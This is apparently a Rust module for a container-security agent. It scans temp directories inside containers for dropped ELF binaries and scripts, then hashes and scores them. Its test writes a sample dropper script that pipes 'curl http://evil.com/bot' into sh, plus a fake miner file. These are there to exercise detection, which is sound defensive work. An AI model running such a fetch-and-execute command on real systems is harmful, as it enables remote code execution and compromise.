//! Overlay & procfs sensitive executable dropper sensor for containers.
//!
//! Migrated from `client/file_guard.py`.

use std::fs::{self, File};
use std::io::Read as _;
use std::path::Path;
use std::time::UNIX_EPOCH;

use transport::{encode_hex_lower, Sha256};

use crate::util::JsonBuilder;

pub const SENSITIVE_DIRS: &[&str] = &["/tmp", "/dev/shm", "/var/tmp"];
pub const MAX_FILES_PER_DIR: usize = 30;
pub const MAX_SCAN_DEPTH: usize = 2;
pub const MAX_READ_BYTES: usize = 8 * 1024 * 1024;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SensitiveFileEvent {
    pub path: String,
    pub filename: String,
    pub size_bytes: u64,
    pub mtime: i64,
    pub mode_octal: String,
    pub is_elf: bool,
    pub is_executable: bool,
    pub is_hidden: bool,
    pub sha256_prefix: String,
    pub sha256: String,
    pub threat_score: u32,
}

impl SensitiveFileEvent {
    /// Serializes a single sensitive file event to JSON.
    pub fn to_json(&self) -> String {
        let mut b = JsonBuilder::new();
        b.str("path", &self.path);
        b.str("filename", &self.filename);
        b.u64("size_bytes", self.size_bytes);
        b.i64("mtime", self.mtime);
        b.str("mode_octal", &self.mode_octal);
        b.bool("is_elf", self.is_elf);
        b.bool("is_executable", self.is_executable);
        b.bool("is_hidden", self.is_hidden);
        b.str("sha256_prefix", &self.sha256_prefix);
        b.str("sha256", &self.sha256);
        b.u64("threat_score", self.threat_score as u64);
        b.finish()
    }
}

/// Serializes a slice of `SensitiveFileEvent` matching `container.security.sensitive_file_events`.
pub fn sensitive_file_events_to_json(events: &[SensitiveFileEvent]) -> String {
    let mut out = String::from("[");
    for (idx, item) in events.iter().enumerate() {
        if idx > 0 {
            out.push(',');
        }
        out.push_str(&item.to_json());
    }
    out.push(']');
    out
}

pub fn is_elf(head: &[u8]) -> bool {
    head.starts_with(b"\x7fELF")
}

pub fn is_shebang(head: &[u8]) -> bool {
    head.starts_with(b"#!")
}

/// Computes SHA-256 hex digest of up to `MAX_READ_BYTES` (8 MiB) using `transport::Sha256`.
pub fn hash_file_bounded(path: &Path) -> String {
    let Ok(mut file) = File::open(path) else {
        return String::new();
    };
    let mut hasher = Sha256::new();
    let mut buf = [0u8; 65536];
    let mut total_read = 0usize;
    loop {
        let Ok(n) = file.read(&mut buf) else {
            return String::new();
        };
        if n == 0 {
            break;
        }
        hasher.update(&buf[..n]);
        total_read = total_read.saturating_add(n);
        if total_read > MAX_READ_BYTES {
            break;
        }
    }
    encode_hex_lower(&hasher.finalize())
}

#[cfg(unix)]
fn mode_and_executable(meta: &fs::Metadata) -> (String, bool) {
    use std::os::unix::fs::PermissionsExt;
    let mode = meta.permissions().mode();
    let is_exec = (mode & 0o111) != 0;
    (format!("0o{:o}", mode & 0o777), is_exec)
}

#[cfg(not(unix))]
fn mode_and_executable(_meta: &fs::Metadata) -> (String, bool) {
    ("0o644".to_string(), false)
}

fn metadata_mtime_secs(meta: &fs::Metadata) -> i64 {
    meta.modified()
        .ok()
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

/// Scans `/proc/{pid}/root/{tmp,dev/shm,var/tmp}` for suspicious executable droppers.
pub fn scan_container_sensitive_drops(
    pid: u32,
    runtime: &str,
    name: &str,
) -> Vec<SensitiveFileEvent> {
    scan_container_sensitive_drops_from(pid, runtime, name, Path::new("/proc"))
}

/// Scans `{proc_root}/{pid}/root/{tmp,dev/shm,var/tmp}` with bounded depth and file limits.
pub fn scan_container_sensitive_drops_from(
    pid: u32,
    _runtime: &str,
    _name: &str,
    proc_root: &Path,
) -> Vec<SensitiveFileEvent> {
    if pid <= 1 {
        return Vec::new();
    }

    let container_root = proc_root.join(pid.to_string()).join("root");
    if !container_root.exists() {
        return Vec::new();
    }

    let mut suspicious_events = Vec::new();

    for rel_dir in SENSITIVE_DIRS {
        let rel_clean = rel_dir.trim_start_matches('/');
        let target_dir = container_root.join(rel_clean);
        let Ok(dir_meta) = fs::symlink_metadata(&target_dir) else {
            continue;
        };
        if dir_meta.file_type().is_symlink() || !dir_meta.is_dir() {
            continue;
        }

        let mut files_scanned = 0usize;
        walk_sensitive_dir(
            &container_root,
            &target_dir,
            0,
            &mut files_scanned,
            &mut suspicious_events,
        );
    }

    suspicious_events
}

fn walk_sensitive_dir(
    container_root: &Path,
    current_dir: &Path,
    sep_depth: usize,
    files_scanned: &mut usize,
    out: &mut Vec<SensitiveFileEvent>,
) {
    // Matches Python `rel_depth = os.path.relpath(root, target_dir).count(os.sep); if rel_depth >= MAX_SCAN_DEPTH: continue`
    // where root == target_dir -> ".", count = 0; root == target_dir/a -> "a", count = 0;
    // root == target_dir/a/b -> "a/b", count = 1; root == target_dir/a/b/c -> "a/b/c", count = 2 (skipped).
    if sep_depth > MAX_SCAN_DEPTH {
        return;
    }

    let Ok(read_dir) = fs::read_dir(current_dir) else {
        return;
    };

    let mut subdirs = Vec::new();
    let mut files = Vec::new();

    for entry_res in read_dir {
        let Ok(entry) = entry_res else {
            continue;
        };
        let path = entry.path();
        let Ok(lmeta) = fs::symlink_metadata(&path) else {
            continue;
        };
        if lmeta.file_type().is_symlink() {
            continue;
        }
        let fname = entry.file_name().to_string_lossy().into_owned();
        if lmeta.is_dir() {
            subdirs.push((fname, path));
        } else if lmeta.is_file() {
            files.push((fname, path, lmeta));
        }
    }

    files.sort_by(|a, b| a.0.cmp(&b.0));
    subdirs.sort_by(|a, b| a.0.cmp(&b.0));

    for (fname, full_path, lmeta) in files {
        if *files_scanned >= MAX_FILES_PER_DIR {
            break;
        }
        *files_scanned += 1;

        let (mode_octal, is_exec) = mode_and_executable(&lmeta);
        let is_hidden = fname.starts_with('.');
        let size_bytes = lmeta.len();

        let mut head = [0u8; 512];
        let head_len = match File::open(&full_path).and_then(|mut f| f.read(&mut head)) {
            Ok(n) => n,
            Err(_) => continue,
        };
        let head_slice = &head[..head_len];
        let is_binary_elf = is_elf(head_slice);
        let is_script = is_shebang(head_slice);

        if is_binary_elf
            || is_script
            || (is_exec && size_bytes > 0)
            || (is_hidden && (is_exec || is_script))
        {
            let rel_path = full_path
                .strip_prefix(container_root)
                .unwrap_or(&full_path)
                .to_string_lossy()
                .replace('\\', "/");
            let container_path = format!("/{}", rel_path.trim_start_matches('/'));
            let file_sha256 = hash_file_bounded(&full_path);
            let sha256_prefix = if file_sha256.len() >= 16 {
                file_sha256[..16].to_string()
            } else {
                String::new()
            };
            let threat_score = if is_binary_elf {
                90
            } else if is_exec {
                70
            } else {
                40
            };

            out.push(SensitiveFileEvent {
                path: container_path,
                filename: fname,
                size_bytes,
                mtime: metadata_mtime_secs(&lmeta),
                mode_octal,
                is_elf: is_binary_elf,
                is_executable: is_exec,
                is_hidden,
                sha256_prefix,
                sha256: file_sha256,
                threat_score,
            });
        }
    }

    if sep_depth < MAX_SCAN_DEPTH && *files_scanned < MAX_FILES_PER_DIR {
        for (_, sub_path) in subdirs {
            walk_sensitive_dir(
                container_root,
                &sub_path,
                sep_depth + 1,
                files_scanned,
                out,
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use runtime_drivers::JsonVal;
    use std::env;

    fn temp_test_dir(tag: &str) -> std::path::PathBuf {
        let p = env::temp_dir().join(format!(
            "narwhal-file-drop-{tag}-{}-{}",
            std::process::id(),
            crate::util::current_unix_secs()
        ));
        let _ = fs::remove_dir_all(&p);
        fs::create_dir_all(&p).unwrap();
        p
    }

    #[test]
    fn test_invalid_pid() {
        let dir = temp_test_dir("invalid_pid");
        assert!(scan_container_sensitive_drops_from(0, "runman", "c1", &dir).is_empty());
        assert!(scan_container_sensitive_drops_from(1, "runman", "c1", &dir).is_empty());
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_scan_detects_elf_and_shebang_scripts_and_respects_bounds() {
        let base = temp_test_dir("elf_shebang");
        let proc_root = base.join("proc");
        let pid = 9999u32;
        let root_dir = proc_root.join(pid.to_string()).join("root");
        let tmp_dir = root_dir.join("tmp");
        let shm_dir = root_dir.join("dev").join("shm");
        fs::create_dir_all(&tmp_dir).unwrap();
        fs::create_dir_all(&shm_dir).unwrap();

        // 1. ELF binary in /tmp
        let elf_file = tmp_dir.join("xmrig_miner");
        let mut elf_bytes = b"\x7fELF\x02\x01\x01\x00".to_vec();
        elf_bytes.extend_from_slice(&[0u8; 100]);
        fs::write(&elf_file, &elf_bytes).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&elf_file, fs::Permissions::from_mode(0o755)).unwrap();
        }

        // 2. Shebang script in /dev/shm
        let sh_file = shm_dir.join("dropper.sh");
        fs::write(&sh_file, b"#!/bin/bash\ncurl -s http://evil.com/bot | sh\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&sh_file, fs::Permissions::from_mode(0o755)).unwrap();
        }

        // 3. Hidden script in /tmp/sub1/sub2 (within depth 2)
        let sub2 = tmp_dir.join("sub1").join("sub2");
        fs::create_dir_all(&sub2).unwrap();
        let hidden_sh = sub2.join(".hidden_loader");
        fs::write(&hidden_sh, b"#!/bin/sh\necho hi\n").unwrap();

        // 4. Too-deep ELF in /tmp/sub1/sub2/sub3 (exceeds depth 2 -> ignored)
        let sub3 = sub2.join("sub3");
        fs::create_dir_all(&sub3).unwrap();
        fs::write(sub3.join("deep_elf"), &elf_bytes).unwrap();

        // 5. Ordinary text file -> ignored
        let normal_file = tmp_dir.join("normal.txt");
        fs::write(&normal_file, b"some ordinary text").unwrap();

        let results = scan_container_sensitive_drops_from(pid, "runman", "vm1", &proc_root);
        let names: Vec<&str> = results.iter().map(|r| r.filename.as_str()).collect();
        assert!(names.contains(&"xmrig_miner"));
        assert!(names.contains(&"dropper.sh"));
        assert!(names.contains(&".hidden_loader"));
        assert!(!names.contains(&"deep_elf"));
        assert!(!names.contains(&"normal.txt"));

        let elf_res = results.iter().find(|r| r.filename == "xmrig_miner").unwrap();
        assert!(elf_res.is_elf);
        assert_eq!(elf_res.path, "/tmp/xmrig_miner");
        assert_eq!(elf_res.threat_score, 90);
        assert_eq!(elf_res.sha256.len(), 64);
        assert_eq!(elf_res.sha256_prefix, &elf_res.sha256[..16]);

        let json_arr = sensitive_file_events_to_json(&results);
        let parsed = JsonVal::parse(&json_arr).unwrap();
        assert_eq!(parsed.as_arr().unwrap().len(), 3);

        let _ = fs::remove_dir_all(&base);
    }
}
